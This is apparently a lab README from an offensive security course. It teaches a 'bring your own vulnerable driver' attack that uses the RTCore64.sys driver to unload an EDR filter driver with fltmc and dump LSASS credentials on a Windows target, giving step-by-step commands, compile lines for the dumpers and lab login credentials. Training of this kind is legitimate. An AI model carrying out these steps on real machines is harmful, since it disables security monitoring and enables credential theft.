# Bring Your Own Vulnerable Driver

The point of this module is to cover the concepts of leveraging drivers to access protected processes and bypass protections.

For more BYOD information or downloads this is a great resource:

https://www.loldrivers.io/

**RTCore64.sys** is the driver we will be abusing.

The driver in Micro-Star MSI Afterburner 4.6.2.15658 (aka RTCore64.sys and RTCore32.sys) allows any authenticated user to read and write to arbitrary memory, I/O ports, and MSRs. This can be exploited for privilege escalation, code execution under high privileges, and information disclosure. These signed drivers can also be used to bypass the Microsoft driver-signing policy to deploy malicious code.

Dumping lsass will be the name of the game. 


1. In the lab environment, open up the **Operator Desktop**, once loaded and the terminal pops up, change the permissions on the lab folder.
`sudo chown pslearner:pslearner -R /home/pslearner/lab`

2. Now change directory to that folder.
`cd /home/pslearner/lab`
3. Open VSCODE.
`code .`
5. Once open, accept any pop ups. Trusting the author etc.
6. In the top left, use the mouse to click "terminal" then "new terminal" to launch a bash terminal in the bottom pane.
7. In the terminal in the bottom plane, run python simple server to host the files.
8. Open the 2-custom-edr-evasion>1-Custom-BYOD folder on the left.
9. Click dump-that-lsass.cpp to open the file.
**Discuss Signatures**
- On Disk / In Memory
- Demo dump-that-lsass execution.
11. Open the **Wndows Target 2**
12. Use the search bar to search for "security" and open the "Windows Security" app.
13. Go to Virus & Threat Protection and click the "turn on" button.
14. Now open an Administrative command prompt by search for cmd.exe, right click the command prompt app and select run as administrator.
15. Change directory to the lab files for this module.
`cd c:\Users\Public\Desktop\LAB_FILES\2-custom-edr-evasion\1-Custom-BYOD`
16. Open task manager, click "more details". Sort using the column "name" with a click. Scroll down to find "Local Security Authority Process". Right click it and open properties. Note this is LSASS. Close the window.
17. Right click the LSASS process gain, and clikc "Create dump file".  Wait a moment and notice the alert.
18. Back in your Administrative CMD prompt. Copy dump-that-lsass.exe to the c drive.
`copy dump-that-lsass.exe c:\dump-that-lsass.exe`
**Discuss Privilege Error**
- system-that-lsass execution
- talk about pp/ppl lsa protection win11/2022
18. In the adminstrative command prompt run **system-that-lsass.exe**
`system-that-lsass.exe`
19. Open windows file explorer and navigate to "C:\Windows\Temp" and open launcher.log and lsass_dumper.log.
20. Open a powershell command prompt and check PPL.
`Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" | Select-Object RunAsPPL`
21. In the Administrative command prompt, use dir to identify the lsass_encoded.bin file.
22. Decode it with decode-that-lsass.exe.
`decode-that-lsass.exe`
22. Go back to the **Operator Desktop**
**discuss nikito**
- miniwritedump
- temp files
23. Time for EDR. Back on the **Windows Target 2** device. Install EDR and file beat monitor.
> [Setup Steps](../../0-setup/README.md)
24. With EDR installed, use the Administrative command prompt to re-run the system-that-lsass.exe program.
`system-that-lsass.exe`
25. Open elasticsearch with the link on the desktop. & Login. un: **elastic** pw: **alwaysbelearning**
26. In he top left go to discover.
27. In the top right change the time to the last 15 minutes. (Feel free to play around with this however you want.)
30. Use free text search to search for "lsass".
**discuss monitoring vs detection**
- don't always have to disable
31. Driver time. Back in the administrative command prompt. Copy the driver to the C:\Windows\Temp folder.
> make sure you are in the "C:\Users\Public\Desktop\LAB_FILES\2-custom-edr-evasion\1-Custom-BYOD"
`copy RTCore64.sys c:\Windows\Temp\RTCore64.sys`
32. Load the driver.
`driver_loader.exe`
33. Check logs in C:\Widnows\Temp\driver_loader.log
34. Check for loaded driver, open services and look for MyRTCore64.
**Discuss why it isn't there**
35. Query for the driver with SC in the command line.
`sc query MyRTCore64`
36. Check for more detail with driverquery.
`driverquery /v /fo table`
36. Unload the driver.
`sc stop MyRTCore64.sys`
**Did you see what I saw?**
37. Unload edrdrv.
`sc stop edrdrv`
**Discuss failure**
38. Run fltmc to detach and unload file filter drivers.
```
fltmc
fltmc instances -f edrdrv
fltmc detach edrdrv c:
fltmc detach edrdrv \Device\Mup
fltmc unload edrdrv
fltmc
```
39. Now Check SC Query.
`sc query edrdrv`
40. Stop edrdrv
`sc stop edrdrv`
41. In your administrative command prompt, run lsass_dumper.exe.
> full path C:\Users\Public\Desktop\LAB_FILES\2-custom-edr-evasion\1-Custom-BYOD
```
cd driver-dumper
lsass_dumper.exe
```
35. Check
36. Run lsass_dumper.exe
`lsass_dumper.exe`
37. Check logs in C:\Windows\Temp\lsass_dumper
**discuss failure**
- Check code for driver-dumper in Operator Desktop
- Talk about BYOD moving forward and whats needed.
39. Go check for your activity after disabling the edrdrv filter in elasticsearch.
> Some search terms.
```
system-that-lsass.exe
lsass_dumper.exe
lsass_encoded.bin
```
> Run more code and see what does and doesn't pop up. this is the end of this module.
**Discussion**

Small pause while we shift gears. Then heading to the custom edr evasion techniques. But keep in mind they are fun and experiemental.
[Custom API EDR Evastion](../2-Custom-API/README.md)













Bring your own Vulnerable Driver.

This is the same method that EDR sandblaster uses to gain control and silence the EDRs, but we are going to dig in just a bit on the function, and how it could be used not just to bypass the EDR but to bypass protected processes like LSASS, in modern windows architectures.

General Process:

1. Load Driver.
2. Leverage Elevated Driver IOCTL to read memeory directly.
3. Profit.

First solution, bypasses EDR but not PPL.

Second solution:



# Signature Evasion


In thos module we are going to create a custom capability using a BYOD, to avoid signatures and defeat not only EDR, but the monitored PPL and CG processes, using LSASS as an example.

In the process, we will learn how it works, and walk away with a baseline to create our own tools that avoid signatured public tooling.

As with the previous modules. This is post compromise, and you have already escalated to some version of local admin on the device.


Identify EDR with Seatbelt. 


Access to protected processes!

- Vulnerable Drive PPL Bypass
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" | Select-Object RunAsPPL


### Dump That Ass

x86_64-w64-mingw32-g++ lsass_dumper.cpp -o lsass_dumper.exe -static
x86_64-w64-mingw32-g++ decode_lsass.cpp -o decode_lsass.exe -static
x86_64-w64-mingw32-g++ system_launcher.cpp -o system_launcher.exe -static

### Strip Debug Symbols

x86_64-w64-mingw32-strip lsass_dumper.exe


## Vulnerable Driver

https://www.loldrivers.io/drivers/e32bc3da-4db1-4858-a62c-6fbe4db6afbd/

RTCore64.sys


x86_64-w64-mingw32-g++ main.cpp -Iheaders -o lsass_dumper.exe -static

